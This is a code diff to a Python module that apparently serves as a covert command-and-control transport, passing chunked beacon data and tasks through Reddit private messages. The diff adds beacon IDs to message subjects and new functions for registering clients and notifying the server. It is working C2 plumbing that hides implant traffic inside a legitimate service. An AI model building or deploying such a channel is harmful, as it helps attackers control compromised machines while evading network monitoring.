@@ -16,6 +16,7 @@ USER_AGENT = ```[var:::user_agent]```
 USERNAME = ```[var:::username]```
 SEND_NAME = ```[var:::send_name]```
 RECV_NAME = ```[var:::recv_name]```
+INIT_NAME = ```[var:::init_name]```
 # END OF CONFIG
 
 # IF YOU NEED DEBUG LOGGING:
@@ -43,12 +44,12 @@ def prepTransport():
 	print "We have successfully authenticated: %s" %(reddit)
 	return reddit
 
-def sendData(data):
+def sendData(beacon_id, data):
 	if len(data) > 10000:
 		data_list = [data[i:i+10000] for i in range(0, len(data), 10000)]
 		sent_counter = 1
 		for message in data_list:
-			cur_subject = SEND_NAME + (" | " + str(sent_counter) + "/" + str(len(data_list)))
+			cur_subject = SEND_NAME + ":" + beacon_id + (" | " + str(sent_counter) + "/" + str(len(data_list)))
 			reddit.redditor(USERNAME).message(cur_subject, message)
 			sent_counter += 1
 		return 0
@@ -57,7 +58,7 @@ def sendData(data):
 		return 0
 
 
-def retrieveData():
+def retrieveData(beacon_id):
 	counter_pattern = re.compile("^.* \| [0-9]+/[0-9]+$")
 	total_count = re.compile("^.*/[0-9]+$")
 	current_target = 1
@@ -77,7 +78,7 @@ def retrieveData():
 				#   set it to the TASK_ID, and start to compile the full task
 				counter_target = message.subject.split("/")[1]
 				
-				if message.subject == (RECV_NAME + " | 1/" + str(counter_target)):
+				if message.subject == (RECV_NAME + ":" + beacon_id + " | 1/" + str(counter_target)):
 					global TASK_ID
 					TASK_ID = message.id
 					task += message.body
@@ -121,3 +122,16 @@ def retrieveData():
 				# message.id isn't right, but we don't have a task yet
 				sleep(5)
 				pass
+
+def check_for_new_clients():
+	for message in reddit.inbox.messages(limit=1):
+		if message.subject == INIT_NAME:
+			task = message.body
+			return task
+	# We went through all the task and found none with an INIT_NAME
+	return None
+
+
+
+def send_server_notification(notification_data_frame):
+	reddit.redditor(USERNAME).message(INIT_NAME, notification_data_frame)
